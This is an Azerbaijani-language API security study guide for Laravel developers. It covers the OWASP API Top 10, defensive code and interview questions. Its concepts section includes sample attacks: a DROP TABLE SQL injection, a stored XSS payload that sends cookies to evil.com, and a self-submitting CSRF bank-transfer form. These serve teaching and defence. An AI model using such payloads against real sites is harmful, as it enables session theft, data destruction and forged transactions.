# API Security

## Nədir? (What is it?)

API Security API-larin icazesiz erisim, data sizintisi, ve muxtelf hucumlardan qorunmasi ucun tetbiq olunan tedbir ve texnikalar mecmusudur. Modern web application-larin boyuk hissesi API-lara esaslandigindan, API tehlukesizliyi kritik ehamiyyete malikdir.

```
OWASP API Security Top 10 (2023):
1. Broken Object Level Authorization (BOLA)
2. Broken Authentication
3. Broken Object Property Level Authorization
4. Unrestricted Resource Consumption
5. Broken Function Level Authorization
6. Unrestricted Access to Sensitive Business Flows
7. Server-Side Request Forgery (SSRF)
8. Security Misconfiguration
9. Improper Inventory Management
10. Unsafe Consumption of APIs
```

## Necə İşləyir? (How does it work?)

### Tehlukesizlik Qatlari

```
Internet
   |
   v
[WAF - Web Application Firewall]    -- Layer 1: Network Protection
   |
   v
[Rate Limiting]                      -- Layer 2: Abuse Prevention
   |
   v
[Authentication]                     -- Layer 3: Kim oldugun
   |
   v
[Authorization]                      -- Layer 4: Ne ede bilersen
   |
   v
[Input Validation]                   -- Layer 5: Melumat yoxlamasi
   |
   v
[Business Logic]                     -- Layer 6: Esasnamə yoxlamasi
   |
   v
[Data Encryption]                    -- Layer 7: Melumat sifrelemesi
   |
   v
[Logging & Monitoring]               -- Layer 8: Izleme
```

## Əsas Konseptlər (Key Concepts)

### 1. SQL Injection

```
Tehlukeli:
  GET /api/users?search='; DROP TABLE users; --

  $query = "SELECT * FROM users WHERE name = '{$search}'";
  // SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

Qorunma: Prepared statements / parameterized queries
```

### 2. XSS (Cross-Site Scripting)

```
Stored XSS:
  POST /api/comments
  {"body": "<script>document.location='https://evil.com?c='+document.cookie</script>"}

  API bu comment-i qaytaranda brauzer script-i icra edir.

Qorunma: Output encoding, Content-Security-Policy header
```

### 3. CSRF (Cross-Site Request Forgery)

```
Attacker-in saytinda:
  <form action="https://bank.com/api/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit();</script>

  Istifadeci bank.com-da login olubsa, brauzer cookie-ni avtomatik gonderir.

Qorunma: CSRF token, SameSite cookie, origin check
```

### 4. BOLA (Broken Object Level Authorization)

```
GET /api/users/42/orders    (oz sifarislerin - OK)
GET /api/users/43/orders    (basqasinin sifarisleri - BOLA!)

Her zaman yoxlayin: bu user bu resource-a erise bilermi?
```

### 5. Mass Assignment

```
POST /api/users
{"name": "Orkhan", "email": "...", "role": "admin"}
                                    ^^^^^^^^^^^^^^^^
  Eger role field qorunmayibsa, user ozunu admin ede biler!
```

## PHP/Laravel ilə İstifadə

### Rate Limiting

```php
// routes/api.php - Laravel built-in throttle
Route::middleware('throttle:60,1')->group(function () {
    // Deqiqede 60 request
    Route::apiResource('users', UserController::class);
});

// Custom rate limiter (app/Providers/AppServiceProvider.php)
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Support\Facades\RateLimiter;

public function boot(): void
{
    // IP bazali
    RateLimiter::for('api', function (Request $request) {
        return Limit::perMinute(60)->by($request->ip());
    });

    // User bazali
    RateLimiter::for('authenticated', function (Request $request) {
        return $request->user()
            ? Limit::perMinute(100)->by($request->user()->id)
            : Limit::perMinute(10)->by($request->ip());
    });

    // Endpoint bazali (login brute-force qorunmasi)
    RateLimiter::for('login', function (Request $request) {
        return [
            Limit::perMinute(5)->by($request->input('email')),
            Limit::perMinute(20)->by($request->ip()),
        ];
    });
}
```

### Input Validation

```php
namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;

class StoreOrderRequest extends FormRequest
{
    public function rules(): array
    {
        return [
            // String validation
            'name' => ['required', 'string', 'max:255', 'regex:/^[\pL\s\-]+$/u'],

            // Email - RFC + DNS check
            'email' => ['required', 'email:rfc,dns', 'max:255'],

            // Integer - range
            'quantity' => ['required', 'integer', 'min:1', 'max:100'],

            // Decimal
            'price' => ['required', 'decimal:2', 'min:0.01', 'max:99999.99'],

            // Enum
            'status' => ['required', 'in:pending,processing,shipped,delivered'],

            // URL
            'website' => ['nullable', 'url:http,https', 'max:500'],

            // Array
            'items' => ['required', 'array', 'min:1', 'max:50'],
            'items.*.product_id' => ['required', 'exists:products,id'],
            'items.*.quantity' => ['required', 'integer', 'min:1'],

            // File
            'attachment' => ['nullable', 'file', 'max:5120', 'mimes:pdf,jpg,png'],

            // No HTML/script injection
            'description' => ['nullable', 'string', 'max:1000'],
        ];
    }

    /**
     * Input sanitization
     */
    protected function prepareForValidation(): void
    {
        $this->merge([
            'name' => strip_tags($this->name),
            'description' => strip_tags($this->description),
            'email' => strtolower(trim($this->email)),
        ]);
    }
}
```

### SQL Injection Protection

```php
// TEHLUKELI - Raw query
$users = DB::select("SELECT * FROM users WHERE name = '$name'"); // ✗

// TEHLUKESIZ - Eloquent ORM (avtomatik parameterized)
$users = User::where('name', $name)->get(); // ✓

// TEHLUKESIZ - Query Builder (avtomatik parameterized)
$users = DB::table('users')->where('name', $name)->get(); // ✓

// TEHLUKESIZ - Raw query with bindings
$users = DB::select('SELECT * FROM users WHERE name = ?', [$name]); // ✓

// TEHLUKELI - orderBy (column name bind olunmur!)
$users = User::orderBy($request->sort)->get(); // ✗

// TEHLUKESIZ - whitelist ile
$allowed = ['name', 'email', 'created_at'];
$sort = in_array($request->sort, $allowed) ? $request->sort : 'created_at';
$users = User::orderBy($sort)->get(); // ✓
```

### XSS Protection

```php
// Blade template (avtomatik escape)
{{ $user->name }}           // ✓ htmlspecialchars() ile escape olunur
{!! $user->bio !!}          // ✗ TEHLUKELI - raw HTML

// API response-da
// Laravel JSON response avtomatik safe-dir (JSON encoding)

// Manual sanitize
use Illuminate\Support\Str;

$clean = strip_tags($input);
$clean = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
$clean = Str::of($input)->stripTags()->toString();

// Content-Security-Policy header
// app/Http/Middleware/SecurityHeaders.php
class SecurityHeaders
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);

        return $response
            ->header('X-Content-Type-Options', 'nosniff')
            ->header('X-Frame-Options', 'DENY')
            ->header('X-XSS-Protection', '1; mode=block')
            ->header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
            ->header('Content-Security-Policy', "default-src 'self'; script-src 'self'")
            ->header('Referrer-Policy', 'strict-origin-when-cross-origin')
            ->header('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    }
}
```

### CSRF Protection

```php
// Laravel-de CSRF avtomatik qorunur (web routes ucun)
// API routes ucun token-based auth istifade edin

// SPA ucun Sanctum CSRF:
// 1. GET /sanctum/csrf-cookie  (XSRF-TOKEN cookie alir)
// 2. POST /login               (Cookie avtomatik gonderilir)

// Manual CSRF yoxlamasi
class ApiCsrfMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        if ($request->isMethod('POST') || $request->isMethod('PUT')
            || $request->isMethod('DELETE')) {
            $token = $request->header('X-CSRF-TOKEN');
            if (!$token || $token !== session('csrf_token')) {
                abort(403, 'CSRF token mismatch');
            }
        }
        return $next($request);
    }
}
```

### Authorization (BOLA Protection)

```php
// Policy ile authorization
namespace App\Policies;

use App\Models\Order;
use App\Models\User;

class OrderPolicy
{
    public function view(User $user, Order $order): bool
    {
        return $user->id === $order->user_id
            || $user->hasRole('admin');
    }

    public function update(User $user, Order $order): bool
    {
        return $user->id === $order->user_id
            && $order->status === 'pending';
    }

    public function delete(User $user, Order $order): bool
    {
        return $user->id === $order->user_id
            && $order->status === 'pending';
    }
}

// Controller-de istifade
class OrderController extends Controller
{
    public function show(Order $order): OrderResource
    {
        $this->authorize('view', $order); // 403 eger icaze yoxdursa

        return new OrderResource($order);
    }

    // Ve ya scope ile
    public function index(Request $request)
    {
        // User yalniz oz order-lerini gore biler
        $orders = $request->user()->orders()->paginate();

        return OrderResource::collection($orders);
    }
}
```

### Mass Assignment Protection

```php
// app/Models/User.php

// Yalniz bu field-ler mass assign oluna biler
protected $fillable = ['name', 'email', 'password'];

// Ve ya: bu field-ler OLMAZ
protected $guarded = ['id', 'role', 'is_admin', 'email_verified_at'];

// API response-dan hassas melumat cixar
protected $hidden = ['password', 'remember_token', 'two_factor_secret'];
```

### API Key Authentication

```php
namespace App\Http\Middleware;

use App\Models\ApiKey;
use Closure;
use Illuminate\Http\Request;

class ValidateApiKey
{
    public function handle(Request $request, Closure $next)
    {
        $key = $request->header('X-API-Key')
            ?? $request->query('api_key');

        if (!$key) {
            return response()->json(['error' => 'API key required'], 401);
        }

        $apiKey = ApiKey::where('key', hash('sha256', $key))
            ->where('is_active', true)
            ->where(function ($q) {
                $q->whereNull('expires_at')
                  ->orWhere('expires_at', '>', now());
            })
            ->first();

        if (!$apiKey) {
            return response()->json(['error' => 'Invalid API key'], 401);
        }

        // Rate limit check
        $apiKey->increment('request_count');
        $apiKey->update(['last_used_at' => now()]);

        $request->merge(['api_key_model' => $apiKey]);

        return $next($request);
    }
}
```

### Logging & Monitoring

```php
namespace App\Http\Middleware;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Closure;

class ApiAuditLog
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);

        // Sensitive endpoint-leri logla
        if ($this->shouldLog($request)) {
            Log::channel('api-audit')->info('API Request', [
                'method' => $request->method(),
                'path' => $request->path(),
                'ip' => $request->ip(),
                'user_id' => $request->user()?->id,
                'status' => $response->getStatusCode(),
                'user_agent' => $request->userAgent(),
                'duration_ms' => round((microtime(true) - LARAVEL_START) * 1000),
            ]);
        }

        // Ugursuz auth cehd-lerini logla
        if ($response->getStatusCode() === 401 || $response->getStatusCode() === 403) {
            Log::channel('security')->warning('Auth failure', [
                'ip' => $request->ip(),
                'path' => $request->path(),
                'status' => $response->getStatusCode(),
            ]);
        }

        return $response;
    }

    private function shouldLog(Request $request): bool
    {
        return $request->isMethod('POST')
            || $request->isMethod('PUT')
            || $request->isMethod('DELETE');
    }
}
```

## Interview Sualları

### 1. OWASP API Top 10-da en boyuk risk nedir?
**Cavab:** BOLA (Broken Object Level Authorization) - user basqa user-in resource-una erise bilmesi. Meselen, `/api/orders/123`-e erisim var, `/api/orders/124`-e de erise bilir. Her endpoint-de resource ownership yoxlanmalidir.

### 2. SQL injection nedir ve nece qorunursuq?
**Cavab:** Attacker SQL kodu input-a inject edir. Qorunma: 1) Prepared statements/parameterized queries, 2) ORM istifade edin (Eloquent), 3) Input validation, 4) Least privilege DB user. Laravel Eloquent avtomatik qoruyur.

### 3. XSS ve CSRF arasinda ferq nedir?
**Cavab:** **XSS** - attacker sehifeye zeresli script inject edir, script user-in brauzerinde isleyir. **CSRF** - attacker user-i bilmeden ona melumat gondermeye mecbur edir (forgery). XSS input/output-a aiddir, CSRF request forgery-dir.

### 4. Rate limiting niye vacibdir?
**Cavab:** Brute-force hucum, DDoS, API abuse, resource exhaustion-un qarsisini alir. Muxtelif seviyyelerde olur: IP bazali, user bazali, endpoint bazali. Laravel-de `throttle` middleware ve `RateLimiter` facade istifade olunur.

### 5. Mass assignment nedir?
**Cavab:** User-in request-de gondermemeli oldugu field-leri deyisdirmesidir (meselen, `role: admin`). Qorunma: `$fillable` ile yalniz icaze verilmis field-leri teyin edin, `$guarded` ile qadagan olunan field-leri teyin edin.

### 6. API key ve OAuth token arasinda ferq nedir?
**Cavab:** API key sabit identifikatordur, adeten masin-to-masin autentifikasiya ucun. OAuth token dinamik-dir, user icazesi ile yaranir, scope ile mehdudlasir, expire olur. OAuth daha tehlukesizdir, API key daha sadedir.

### 7. Hansi security headerlari istifade etmeliyik?
**Cavab:** `Strict-Transport-Security` (HTTPS mecburi), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (clickjacking), `Content-Security-Policy` (XSS), `Referrer-Policy`, `Permissions-Policy`.

## Best Practices

1. **HTTPS hemise** - Butun API traffic sifreli olmali
2. **Input validation** - Her field-i validate edin, whitelist yanasmasi
3. **Parameterized queries** - SQL injection qorunmasi
4. **Rate limiting** - Muxtelif seviyyelerde
5. **Authentication + Authorization** - Her endpoint-de her ikisi
6. **Security headers** - HSTS, CSP, X-Frame-Options
7. **Audit logging** - Butun hassas emeliyyatlari loglayin
8. **Error messages** - Stack trace/internal detail gostermeyin
9. **Dependency updates** - `composer audit` ile vulnerabilities yoxlayin
10. **Principle of least privilege** - Minimum icaze verin
